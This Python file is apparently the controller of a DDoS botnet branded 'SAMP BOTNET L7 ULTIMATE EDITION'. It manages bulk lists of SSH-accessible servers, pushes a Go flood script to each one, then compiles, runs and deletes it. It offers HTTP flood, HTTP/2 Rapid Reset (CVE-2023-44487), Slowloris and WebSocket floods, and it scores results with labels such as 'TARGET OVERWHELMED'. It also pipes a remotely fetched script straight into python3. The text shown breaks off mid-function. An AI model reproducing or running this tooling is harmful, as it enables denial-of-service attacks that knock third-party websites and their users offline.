#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import paramiko
import threading
from datetime import datetime
import re
import socket
import select
import random

# ================= [ KONFIGGURASI ] =================
DB_FILE = "servers.json"
DEFAULT_KEY_FILE = os.path.expanduser("~/.ssh/id_rsa")

COLOR = {
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'purple': '\033[95m',
    'cyan': '\033[96m',
    'white': '\033[97m',
    'reset': '\033[0m',
    'bold': '\033[1m'
}

# ================= [ DATABASE ] =================
def load_servers():
    """Load servers with two separate pools: password and key"""
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                data = json.load(f)
                if 'stats' not in data:
                    data['stats'] = {}
                if 'total_attacks' not in data['stats']:
                    data['stats']['total_attacks'] = 0
                if 'total_requests' not in data['stats']:
                    data['stats']['total_requests'] = 0
                if 'total_bytes' not in data['stats']:
                    data['stats']['total_bytes'] = 0
                if 'total_time' not in data['stats']:
                    data['stats']['total_time'] = 0
                if 'servers_password' not in data:
                    data['servers_password'] = []
                if 'servers_key' not in data:
                    data['servers_key'] = []
                return data
        except:
            pass
    return {
        "servers_password": [],
        "servers_key": [],
        "stats": {
            "total_attacks": 0,
            "total_requests": 0,
            "total_bytes": 0,
            "total_time": 0
        }
    }

def save_servers(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ================= [ SSH EXECUTION & SFTP ] =================
def get_ssh_connection(server):
    """Create and return an SSH client connected to the server"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    connect_args = {
        'hostname': server['host'],
        'port': server.get('port', 22),
        'username': server['username'],
        'timeout': 10,
        'allow_agent': False,
        'look_for_keys': False
    }
    
    if server.get('auth_type') == 'key':
        key_file = server.get('key_file', DEFAULT_KEY_FILE)
        if os.path.exists(key_file):
            pkey = paramiko.RSAKey.from_private_key_file(key_file)
            connect_args['pkey'] = pkey
        else:
            raise Exception(f"Private key not found: {key_file}")
    else:
        connect_args['password'] = server['password']
    
    ssh.connect(**connect_args)
    return ssh

def execute_ssh(server, command, timeout=60):
    """Execute command via SSH with password or key authentication"""
    ssh = None
    try:
        ssh = get_ssh_connection(server)
        stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout, get_pty=True)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        if error and not output:
            return f"ERROR: {error}"
        return output + error
    except Exception as e:
        return f"ERROR: {str(e)}"
    finally:
        if ssh:
            ssh.close()

def upload_and_run(server, script_content, proxy_content=None, compile_timeout=120, run_timeout=60):
    """
    Upload Go script via SFTP, compile and run it.
    Returns (success, output)
    """
    ssh = None
    sftp = None
    try:
        ssh = get_ssh_connection(server)
        sftp = ssh.open_sftp()
        
        # Create temporary directory
        ssh.exec_command("mkdir -p /tmp/goattack")
        time.sleep(0.5)
        
        # Upload script
        remote_script = "/tmp/goattack/attack.go"
        with sftp.file(remote_script, 'w') as f:
            f.write(script_content)
        
        # Upload proxy.txt if provided
        if proxy_content:
            remote_proxy = "/tmp/goattack/proxy.txt"
            with sftp.file(remote_proxy, 'w') as f:
                f.write(proxy_content)
        
        # Compile command
        compile_cmd = """
        cd /tmp/goattack
        GO_CMD=""
        if command -v go &> /dev/null; then
            GO_CMD="go"
        elif [ -f /usr/local/go/bin/go ]; then
            GO_CMD="/usr/local/go/bin/go"
        elif [ -f /usr/bin/go ]; then
            GO_CMD="/usr/bin/go"
        else
            echo "GO_NOT_FOUND"
            exit 1
        fi
        $GO_CMD mod init attack 2>/dev/null
        $GO_CMD get golang.org/x/net/http2 golang.org/x/net/proxy github.com/gorilla/websocket 2>/dev/null
        $GO_CMD mod tidy 2>/dev/null
        $GO_CMD build -ldflags="-s -w" -o attack attack.go
        """
        stdin, stdout, stderr = ssh.exec_command(compile_cmd, timeout=compile_timeout)
        compile_out = stdout.read().decode('utf-8', errors='ignore')
        compile_err = stderr.read().decode('utf-8', errors='ignore')
        
        if "GO_NOT_FOUND" in compile_out + compile_err:
            return False, "Go not found on server"
        
        # Check if compilation succeeded
        stdin, stdout, stderr = ssh.exec_command("test -f /tmp/goattack/attack && echo OK")
        if "OK" not in stdout.read().decode():
            return False, "Compilation failed: " + compile_err[:200]
        
        # Run attack
        run_cmd = "cd /tmp/goattack && nice -n -20 ./attack"
        stdin, stdout, stderr = ssh.exec_command(run_cmd, timeout=run_timeout, get_pty=True)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        
        # Cleanup
        ssh.exec_command("rm -rf /tmp/goattack")
        
        if error and not output:
            return False, error
        return True, output + error
        
    except Exception as e:
        return False, str(e)
    finally:
        if sftp:
            sftp.close()
        if ssh:
            ssh.close()

# ================= [ TEST SERVER ] =================
def test_server(server):
    """Test server connection and setup Go + dependencies for L7 attack"""
    print(f"{COLOR['yellow']}🔄 Testing {server['host']}...{COLOR['reset']}")
    
    # Test basic connection
    result = execute_ssh(server, "echo OK")
    if "ERROR" in result:
        print(f"{COLOR['red']}❌ SSH Failed: {result[:50]}{COLOR['reset']}")
        return False
    
    # Check system resources
    sys_check = """
    echo "=== SYSTEM INFO ==="
    nproc
    free -m | grep Mem | awk '{print $2}'
    cat /proc/cpuinfo | grep "model name" | head -1
    uptime | awk '{print $10" "$11" "$12}'
    """
    result = execute_ssh(server, sys_check)
    lines = result.split('\n')
    
    if len(lines) >= 3:
        try:
            cpu_cores = int(lines[1].strip())
            ram_mb = int(lines[2].strip())
            cpu_model = lines[3].strip() if len(lines) > 3 else "Unknown"
            load = lines[4].strip() if len(lines) > 4 else "Unknown"
            
            print(f"{COLOR['cyan']}ℹ️ CPU: {cpu_cores} cores ({cpu_model}){COLOR['reset']}")
            print(f"{COLOR['cyan']}ℹ️ RAM: {ram_mb}MB, Load: {load}{COLOR['reset']}")
            
            server['cpu_cores'] = cpu_cores
            server['ram_mb'] = ram_mb
            server['cpu_model'] = cpu_model
        except:
            server['cpu_cores'] = 2
            server['ram_mb'] = 2048
            server['cpu_model'] = "Unknown"
    
    # Check Go
    check_go = """
    if command -v go &> /dev/null; then
        go version
    elif [ -f /usr/local/go/bin/go ]; then
        /usr/local/go/bin/go version
    elif [ -f /usr/bin/go ]; then
        /usr/bin/go version
    else
        echo "GO_NOT_FOUND"
    fi
    """
    
    result = execute_ssh(server, check_go)
    
    if "go version" in result:
        for line in result.split('\n'):
            if "go version" in line:
                print(f"{COLOR['green']}✅ Go: {line.strip()}{COLOR['reset']}")
                server['active'] = True
                test_network(server)
                return True
    
    # Install Go
    print(f"{COLOR['yellow']}⚠️ Go not found, installing...{COLOR['reset']}")
    
    install_cmd = """
    cd /tmp
    wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
    tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
    rm -f go1.21.0.linux-amd64.tar.gz
    ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null
    echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
    echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.profile
    /usr/local/go/bin/go version
    """
    
    result = execute_ssh(server, install_cmd, timeout=120)
    
    if "go version" in result:
        print(f"{COLOR['green']}✅ Go installed successfully{COLOR['reset']}")
        server['active'] = True
        test_network(server)
        return True
    else:
        print(f"{COLOR['red']}❌ Go installation failed{COLOR['reset']}")
        server['active'] = False
        return False

def test_network(server):
    """Test network speed and latency"""
    print(f"{COLOR['cyan']}📡 Testing network...{COLOR['reset']}")
    
    # Test ping ke Google DNS
    ping_cmd = "ping -c 2 8.8.8.8 | tail -1 | awk -F '/' '{print $5}'"
    result = execute_ssh(server, ping_cmd)
    
    try:
        latency = float(result.strip())
        print(f"{COLOR['green']}✅ Latency: {latency:.1f}ms{COLOR['reset']}")
        server['latency'] = latency
    except:
        server['latency'] = 999
    
    # Test bandwidth (speedtest minimal)
    bw_cmd = "curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python3 - --simple | grep Download | awk '{print $2}'"
    result = execute_ssh(server, bw_cmd, timeout=30)
    
    try:
        bandwidth = float(result.strip())
        print(f"{COLOR['green']}✅ Bandwidth: {bandwidth:.1f} Mbit/s{COLOR['reset']}")
        server['bandwidth'] = bandwidth
    except:
        server['bandwidth'] = 100

# ================= [ GENERATE GO SCRIPT ] =================
def generate_go_script(target_url, duration, method, threads):
    """Generate Go attack script for L7"""
    try:
        with open('attackl7.go', 'r') as f:
            template = f.read()
        
        script = template.replace('{{.TargetURL}}', target_url)
        script = script.replace('{{.Duration}}', str(duration))
        script = script.replace('{{.Threads}}', str(threads))
        script = script.replace('{{.Method}}', method.upper())
        
        return script
    except Exception as e:
        print(f"{COLOR['red']}❌ Error reading attackl7.go: {e}{COLOR['reset']}")
        sys.exit(1)

# ================= [ DEPLOY ATTACK ] =================
def deploy_attack(servers, target_url, duration, method, threads, use_proxy):
    print(f"\n{COLOR['cyan']}{COLOR['bold']}⚔️ DEPLOYING L7 ATTACK TO {len(servers)} SERVERS{COLOR['reset']}")
    print(f"🎯 Target URL: {target_url}")
    print(f"⏱️ Duration: {duration}s")
    print(f"🔧 Method: {method.upper()}")
    print(f"⚡ Threads/server: {threads}")
    print(f"📊 Total Threads: {len(servers) * threads}")
    print(f"🌐 Proxy mode: {'ON' if use_proxy else 'OFF'}")
    
    total_bw = sum([s.get('bandwidth', 100) for s in servers])
    est_rps = threads * 50 * len(servers)
    print(f"🌐 Total Bandwidth: {total_bw:.0f} Mbps")
    print(f"💀 Estimated RPS: {format_number(est_rps)}\n")
    
    # Generate script
    go_script = generate_go_script(target_url, duration, method, threads)
    
    # Load proxy content if needed
    proxy_content = None
    if use_proxy and os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxy_content = f.read()
    
    total_requests = 0
    total_bytes = 0
    success_count = 0
    failed_count = 0
    server_results = []
    start_time_all = time.time()
    results_lock = threading.Lock()
    
    def attack_server(server, index):
        nonlocal total_requests, total_bytes, success_count, failed_count
        server_start = time.time()
        
        success, output = upload_and_run(server, go_script, proxy_content,
                                         compile_timeout=120, run_timeout=duration+60)
        
        if success:
            # Parse output for stats
            server_requests = 0
            server_bytes = 0
            avg_rps = 0
            avg_mbps = 0
            avg_gbps = 0
            
            # Total Requests
            match = re.search(r'📦 TOTAL REQUESTS:\s+([\d.]+[KMBT]?)', output)
            if match:
                server_requests = parse_number(match.group(1))
            # Total Data
            match = re.search(r'📊 TOTAL DATA:\s+([\d.]+) MB', output)
            if match:
                server_bytes = float(match.group(1)) * 1024 * 1024
            # Average RPS
            match = re.search(r'⚡ AVERAGE RPS:\s+([\d.]+[KMBT]?)', output)
            if match:
                avg_rps = parse_number(match.group(1))
            # Average MBPS
            match = re.search(r'🌐 AVERAGE MBPS:\s+([\d.]+)', output)
            if match:
                avg_mbps = float(match.group(1))
            # Average GBPS
            match = re.search(r'💀 AVERAGE GBPS:\s+([\d.]+)', output)
            if match:
                avg_gbps = float(match.group(1))
            
            elapsed = time.time() - server_start
            
            with results_lock:
                total_requests += server_requests
                total_bytes += int(server_bytes)
                success_count += 1
            
            print(f"\n{COLOR['green']}✅ Server {index+1}: {server['host']} | Requests: {format_number(server_requests)} | Data: {server_bytes/1024/1024:.1f}MB | RPS: {format_number(avg_rps)} | {avg_gbps:.2f} Gbps | Time: {elapsed:.1f}s{COLOR['reset']}")
            
            server_results.append({
                'host': server['host'],
                'success': True,
                'requests': server_requests,
                'bytes': server_bytes,
                'avg_rps': avg_rps,
                'avg_mbps': avg_mbps,
                'avg_gbps': avg_gbps,
                'time': elapsed
            })
        else:
            with results_lock:
                failed_count += 1
            print(f"\n{COLOR['red']}❌ Server {index+1}: {server['host']} | Failed: {output[:200]}{COLOR['reset']}")
            server_results.append({
                'host': server['host'],
                'success': False,
                'error': output[:100]
            })
    
    # Launch threads
    threads_list = []
    for i, server in enumerate(servers):
        t = threading.Thread(target=attack_server, args=(server, i))
        t.start()
        threads_list.append(t)
        time.sleep(0.2)
    
    # Progress indicator
    start_wait = time.time()
    while any(t.is_alive() for t in threads_list):
        elapsed = time.time() - start_wait
        remaining = duration - elapsed
        if remaining > 0:
            sys.stdout.write(f"\r⏳ Attack in progress: {elapsed:.0f}s / {duration}s ({len([t for t in threads_list if not t.is_alive()])}/{len(servers)} servers done)")
            sys.stdout.flush()
        time.sleep(1)
    print("\n")
    
    for t in threads_list:
        t.join()
    
    total_time = time.time() - start_time_all
    
    # Update stats
    try:
        data = load_servers()
        data['stats']['total_attacks'] = data['stats'].get('total_attacks', 0) + 1
        data['stats']['total_requests'] = data['stats'].get('total_requests', 0) + total_requests
        data['stats']['total_bytes'] = data['stats'].get('total_bytes', 0) + total_bytes
        data['stats']['total_time'] = data['stats'].get('total_time', 0) + total_time
        save_servers(data)
    except Exception as e:
        print(f"{COLOR['red']}⚠️ Stats update failed: {e}{COLOR['reset']}")
    
    # Calculate final stats
    avg_rps_total = 0
    avg_mbps_total = 0
    avg_gbps_total = 0
    
    if total_requests > 0 and duration > 0:
        avg_rps_total = total_requests // duration
        if total_bytes > 0:
            avg_mbps_total = (total_bytes * 8) / (duration * 1024 * 1024)
            avg_gbps_total = avg_mbps_total / 1000
    
    peak_rps = max([r.get('avg_rps', 0) for r in server_results if r.get('success')] or [0])
    peak_gbps = max([r.get('avg_gbps', 0) for r in server_results if r.get('success')] or [0])
    
    # Final report
    print(f"\n\n{COLOR['cyan']}{COLOR['bold']}╔════════════════════════════════════════════════════════════════════════════════════════════════╗{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                         L7 ATTACK FINAL STATISTICS                                             ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}╠════════════════════════════════════════════════════════════════════════════════════════════════╣{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                                                                                                ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  Target URL: {target_url[:70]}                                                         ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  Duration: {duration}s                                                                         ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  Method: {method.upper()}                                                                      ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  Servers: {success_count}/{len(servers)} successful                                            ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                                                                                                ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  📦 TOTAL REQUESTS:      {format_number(total_requests):>30}                                    ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  📊 TOTAL DATA:          {format_number(total_bytes):>30} bytes ({total_bytes/1024/1024/1024:.2f} GB)║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  ⚡ AVERAGE RPS:          {format_number(avg_rps_total):>30}                                    ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  🌐 AVERAGE MBPS:         {format_number(int(avg_mbps_total)):>30}                              ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  💀 AVERAGE GBPS:         {avg_gbps_total:>30.2f}                                                ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  🔥 PEAK RPS:             {format_number(peak_rps):>30}                                        ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  ⚡ PEAK GBPS:             {peak_gbps:>30.2f}                                                    ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                                                                                                ║{COLOR['reset']}")
    
    impact = ""
    if avg_gbps_total > 10:
        impact = f"{COLOR['red']}💀💀💀 TARGET OVERWHELMED 💀💀💀{COLOR['reset']}"
    elif avg_gbps_total > 5:
        impact = f"{COLOR['red']}💀💀 TARGET CRIPPLED 💀💀{COLOR['reset']}"
    elif avg_gbps_total > 2:
        impact = f"{COLOR['red']}💀 TARGET SLOWED 💀{COLOR['reset']}"
    elif avg_gbps_total > 1:
        impact = f"{COLOR['yellow']}⚠️ TARGET LAGGING ⚠️{COLOR['reset']}"
    else:
        impact = f"{COLOR['green']}✅ LIGHT PRESSURE ✅{COLOR['reset']}"
    
    print(f"{COLOR['cyan']}{COLOR['bold']}║  {impact:^80} ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}╚════════════════════════════════════════════════════════════════════════════════════════════════╝{COLOR['reset']}")
    
    return server_results

# ================= [ MENU FUNCTIONS ] =================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{COLOR['red']}{COLOR['bold']}
╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                ║
║                     🔥 SAMP BOTNET L7 ULTIMATE EDITION v1 🔥                                   ║
║               L7 ATTACK ENGINE - CLOUDFLARE BYPASS + ORIGIN DISCOVERY                         ║
║                                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════════════════════╝
{COLOR['reset']}
    """
    print(banner)

def menu_manage_servers(data):
    while True:
        clear_screen()
        print_banner()
        print(f"{COLOR['cyan']}📌 SERVER MANAGEMENT - DUAL MODE (L7){COLOR['reset']}")
        print(f"{COLOR['green']}1️⃣  Manage Password Servers (🔒){COLOR['reset']}")
        print(f"{COLOR['blue']}2️⃣  Manage SSH Key Servers (🔑){COLOR['reset']}")
        print("3️⃣  Back to Main Menu")
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        if choice == '1':
            menu_password_servers(data)
        elif choice == '2':
            menu_key_servers(data)
        elif choice == '3':
            break

def menu_password_servers(data):
    while True:
        clear_screen()
        print_banner()
        print(f"{COLOR['green']}🔒 PASSWORD SERVERS MANAGEMENT (L7){COLOR['reset']}\n")
        pwd_servers = data.get('servers_password', [])
        if not pwd_servers:
            print("No password servers configured.\n")
        else:
            total_bw = sum([s.get('bandwidth', 0) for s in pwd_servers if s.get('active')])
            total_cores = sum([s.get('cpu_cores', 0) for s in pwd_servers if s.get('active')])
            print(f"{COLOR['bold']}Active: {len([s for s in pwd_servers if s.get('active')])} | Total BW: {total_bw:.0f} Mbps | Total Cores: {total_cores}{COLOR['reset']}\n")
            for i, s in enumerate(pwd_servers, 1):
                status = "✅" if s.get('active', False) else "⏳"
                cpu = s.get('cpu_cores', '?')
                bw = s.get('bandwidth', '?')
                lat = s.get('latency', '?')
                print(f"{status} {i}. {s['host']} - {s['username']} | CPU: {cpu} cores | BW: {bw}Mbps | Lat: {lat}ms")
        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
        print("1️⃣  Add Password Server")
        print("2️⃣  Bulk Add Password Servers (from file)")
        print("3️⃣  Remove Password Server")
        print("4️⃣  Test Password Server")
        print("5️⃣  Test All Password Servers")
        print("6️⃣  Back")
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        if choice == '1':
            host = input("Host/IP: ")
            username = input("Username: ")
            password = input("Password: ")
            port = input("Port SSH (22): ") or "22"
            server = {
                'host': host, 'username': username, 'password': password, 'port': int(port),
                'auth_type': 'password', 'added': time.time(), 'active': False,
                'cpu_cores': 0, 'ram_mb': 0, 'bandwidth': 100, 'latency': 999
            }
            data['servers_password'].append(server)
            save_servers(data)
            print(f"{COLOR['green']}✅ Password server added{COLOR['reset']}")
            time.sleep(1)
        elif choice == '2':
            print("Format file: host:port:username:password per line")
            file_path = input("Path ke file: ")
            try:
                with open(file_path, 'r') as f:
                    lines = f.readlines()
                count = 0
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 4:
                            host = parts[0]
                            port = int(parts[1])
                            username = parts[2]
                            password = ':'.join(parts[3:])
                            server = {
                                'host': host, 'username': username, 'password': password, 'port': port,
                                'auth_type': 'password', 'added': time.time(), 'active': False,
                                'cpu_cores': 0, 'ram_mb': 0, 'bandwidth': 100, 'latency': 999
                            }
                            data['servers_password'].append(server)
                            count += 1
                save_servers(data)
                print(f"{COLOR['green']}✅ {count} password servers added{COLOR['reset']}")
            except Exception as e:
                print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
            time.sleep(2)
        elif choice == '3':
            if not data['servers_password']:
                print("No password servers to remove")
                time.sleep(1)
                continue
            print("\nSelect server to remove:")
            for i, s in enumerate(data['servers_password'], 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Number: ")) - 1
                if 0 <= idx < len(data['servers_password']):
                    removed = data['servers_password'].pop(idx)
                    save_servers(data)
                    print(f"{COLOR['green']}✅ {removed['host']} removed{COLOR['reset']}")
                else:
                    print("Invalid number")
            except:
                print("Invalid input")
            time.sleep(1)
        elif choice == '4':
            if not data['servers_password']:
                print("No password servers to test")
                time.sleep(1)
                continue
            print("\nSelect server to test:")
            for i, s in enumerate(data['servers_password'], 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Number: ")) - 1
                if 0 <= idx < len(data['servers_password']):
                    server = data['servers_password'][idx]
                    if test_server(server):
                        server['active'] = True
                    else:
                        server['active'] = False
                    save_servers(data)
                else:
                    print("Invalid number")
            except:
                print("Invalid input")
            input("\nEnter to continue...")
        elif choice == '5':
            if not data['servers_password']:
                print("No password servers to test")
                time.sleep(1)
                continue
            print(f"\n{COLOR['yellow']}Testing all password servers...{COLOR['reset']}")
            def test_single(server, idx):
                print(f"\n[{idx+1}/{len(data['servers_password'])}] Testing {server['host']}...")
                if test_server(server):
                    server['active'] = True
                else:
                    server['active'] = False
            threads = []
            for i, server in enumerate(data['servers_password']):
                t = threading.Thread(target=test_single, args=(server, i))
                t.start()
                threads.append(t)
                time.sleep(0.5)
            for t in threads:
                t.join()
            save_servers(data)
            active = len([s for s in data['servers_password'] if s.get('active')])
            print(f"\n{COLOR['green']}✅ Test complete. Active: {active}/{len(data['servers_password'])}{COLOR['reset']}")
            input("\nEnter to continue...")
        elif choice == '6':
            break

def menu_key_servers(data):
    global DEFAULT_KEY_FILE
    while True:
        clear_screen()
        print_banner()
        print(f"{COLOR['blue']}🔑 SSH KEY SERVERS MANAGEMENT (L7){COLOR['reset']}\n")
        key_servers = data.get('servers_key', [])
        if not key_servers:
            print("No SSH key servers configured.\n")
        else:
            total_bw = sum([s.get('bandwidth', 0) for s in key_servers if s.get('active')])
            total_cores = sum([s.get('cpu_cores', 0) for s in key_servers if s.get('active')])
            print(f"{COLOR['bold']}Active: {len([s for s in key_servers if s.get('active')])} | Total BW: {total_bw:.0f} Mbps | Total Cores: {total_cores}{COLOR['reset']}\n")
            for i, s in enumerate(key_servers, 1):
                status = "✅" if s.get('active', False) else "⏳"
                cpu = s.get('cpu_cores', '?')
                bw = s.get('bandwidth', '?')
                lat = s.get('latency', '?')
                key_file = s.get('key_file', DEFAULT_KEY_FILE)
                print(f"{status} {i}. {s['host']} - {s['username']} | CPU: {cpu} cores | BW: {bw}Mbps | Lat: {lat}ms | Key: {os.path.basename(key_file)}")
        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
        print("1️⃣  Add SSH Key Server")
        print("2️⃣  Bulk Add SSH Key Servers (from file)")
        print("3️⃣  Remove SSH Key Server")
        print("4️⃣  Test SSH Key Server")
        print("5️⃣  Test All SSH Key Servers")
        print("6️⃣  Set Global Private Key Path")
        print("7️⃣  Back")
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        if choice == '1':
            host = input("Host/IP: ")
            username = input("Username: ")
            key_file = input(f"Path to private key [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
            port = input("Port SSH (22): ") or "22"
            server = {
                'host': host, 'username': username, 'key_file': key_file, 'port': int(port),
                'auth_type': 'key', 'added': time.time(), 'active': False,
                'cpu_cores': 0, 'ram_mb': 0, 'bandwidth': 100, 'latency': 999
            }
            data['servers_key'].append(server)
            save_servers(data)
            print(f"{COLOR['green']}✅ SSH key server added{COLOR['reset']}")
            time.sleep(1)
        elif choice == '2':
            print("Format file: host:port:username:key_file_path")
            file_path = input("Path ke file: ")
            try:
                with open(file_path, 'r') as f:
                    lines = f.readlines()
                count = 0
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 4:
                            host = parts[0]
                            port = int(parts[1])
                            username = parts[2]
                            key_file = ':'.join(parts[3:])
                            server = {
                                'host': host, 'username': username, 'key_file': key_file, 'port': port,
                                'auth_type': 'key', 'added': time.time(), 'active': False,
                                'cpu_cores': 0, 'ram_mb': 0, 'bandwidth': 100, 'latency': 999
                            }
                            data['servers_key'].append(server)
                            count += 1
                save_servers(data)
                print(f"{COLOR['green']}✅ {count} SSH key servers added{COLOR['reset']}")
            except Exception as e:
                print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
            time.sleep(2)
        elif choice == '3':
            if not data['servers_key']:
                print("No SSH key servers to remove")
                time.sleep(1)
                continue
            print("\nSelect server to remove:")
            for i, s in enumerate(data['servers_key'], 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Number: ")) - 1
                if 0 <= idx < len(data['servers_key']):
                    removed = data['servers_key'].pop(idx)
                    save_servers(data)
                    print(f"{COLOR['green']}✅ {removed['host']} removed{COLOR['reset']}")
                else:
                    print("Invalid number")
            except:
                print("Invalid input")
            time.sleep(1)
        elif choice == '4':
            if not data['servers_key']:
                print("No SSH key servers to test")
                time.sleep(1)
                continue
            print("\nSelect server to test:")
            for i, s in enumerate(data['servers_key'], 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Number: ")) - 1
                if 0 <= idx < len(data['servers_key']):
                    server = data['servers_key'][idx]
                    if test_server(server):
                        server['active'] = True
                    else:
                        server['active'] = False
                    save_servers(data)
                else:
                    print("Invalid number")
            except:
                print("Invalid input")
            input("\nEnter to continue...")
        elif choice == '5':
            if not data['servers_key']:
                print("No SSH key servers to test")
                time.sleep(1)
                continue
            print(f"\n{COLOR['yellow']}Testing all SSH key servers...{COLOR['reset']}")
            def test_single(server, idx):
                print(f"\n[{idx+1}/{len(data['servers_key'])}] Testing {server['host']}...")
                if test_server(server):
                    server['active'] = True
                else:
                    server['active'] = False
            threads = []
            for i, server in enumerate(data['servers_key']):
                t = threading.Thread(target=test_single, args=(server, i))
                t.start()
                threads.append(t)
                time.sleep(0.5)
            for t in threads:
                t.join()
            save_servers(data)
            active = len([s for s in data['servers_key'] if s.get('active')])
            print(f"\n{COLOR['green']}✅ Test complete. Active: {active}/{len(data['servers_key'])}{COLOR['reset']}")
            input("\nEnter to continue...")
        elif choice == '6':
            new_key = input(f"Enter new default private key path [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
            DEFAULT_KEY_FILE = new_key
            print(f"{COLOR['green']}✅ Global private key path set to {DEFAULT_KEY_FILE}{COLOR['reset']}")
            time.sleep(1)
        elif choice == '7':
            break

def menu_launch_attack(data):
    pwd_active = [s for s in data.get('servers_password', []) if s.get('active', False)]
    key_active = [s for s in data.get('servers_key', []) if s.get('active', False)]
    if not pwd_active and not key_active:
        print(f"{COLOR['red']}❌ No active servers! Please test servers first.{COLOR['reset']}")
        input("\nEnter to continue...")
        return
    clear_screen()
    print_banner()
    print(f"{COLOR['cyan']}🎯 LAUNCH L7 ATTACK{COLOR['reset']}")
    print(f"🔒 Active Password Servers: {len(pwd_active)}")
    print(f"🔑 Active SSH Key Servers: {len(key_active)}")
    print(f"📊 Total Active Servers: {len(pwd_active) + len(key_active)}")
    print(f"\n{COLOR['bold']}Select server pool:{COLOR['reset']}")
    print("1️⃣  Use only Password Servers")
    print("2️⃣  Use only SSH Key Servers")
    print("3️⃣  Use ALL Servers (Password + Key)")
    pool_choice = input(f"{COLOR['yellow']}Choice (1-3): {COLOR['reset']}")
    if pool_choice == '1':
        servers = pwd_active
    elif pool_choice == '2':
        servers = key_active
    else:
        servers = pwd_active + key_active
    if not servers:
        print(f"{COLOR['red']}❌ No servers in selected pool!{COLOR['reset']}")
        input("\nEnter to continue...")
        return
    total_cores = sum([s.get('cpu_cores', 2) for s in servers])
    total_ram = sum([s.get('ram_mb', 2048) for s in servers]) / 1024
    total_bw = sum([s.get('bandwidth', 100) for s in servers])
    print(f"\n{COLOR['cyan']}Selected pool:{COLOR['reset']}")
    print(f"Total Servers: {len(servers)}")
    print(f"Total CPU Cores: {total_cores}")
    print(f"Total RAM: {total_ram:.1f} GB")
    print(f"Total Bandwidth: {total_bw:.0f} Mbps ({total_bw/1000:.1f} Gbps)\n")
    try:
        target_url = input("Target URL (e.g., https://target.com/): ")
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url
        duration = int(input("Duration (detik): ") or "60")
        print(f"\n{COLOR['bold']}Pilih Method L7:{COLOR['reset']}")
        print("1️⃣ HTTP_FLOOD - Standard HTTP flood with random headers")
        print("2️⃣ HTTP2_RAPID - HTTP/2 Rapid Reset (CVE-2023-44487)")
        print("3️⃣ SLOWLORIS - Slowloris connection exhaustion")
        print("4️⃣ WEBSOCKET - WebSocket flood")
        print("5️⃣ GOD_L7 - ALL methods combined (maximum power) 💀")
        method_choice = input("Pilih method (1-5): ") or "5"
        methods = {'1': 'HTTP_FLOOD', '2': 'HTTP2_RAPID', '3': 'SLOWLORIS', '4': 'WEBSOCKET', '5': 'GOD_L7'}
        method = methods.get(method_choice, 'GOD_L7')
        use_proxy = input("Use proxy? (y/n): ").lower() == 'y'
        if use_proxy and not os.path.exists('proxy.txt'):
            print(f"{COLOR['yellow']}⚠️ proxy.txt not found locally, but will use server's proxy.txt if available{COLOR['reset']}")
        avg_cpu = total_cores / len(servers)
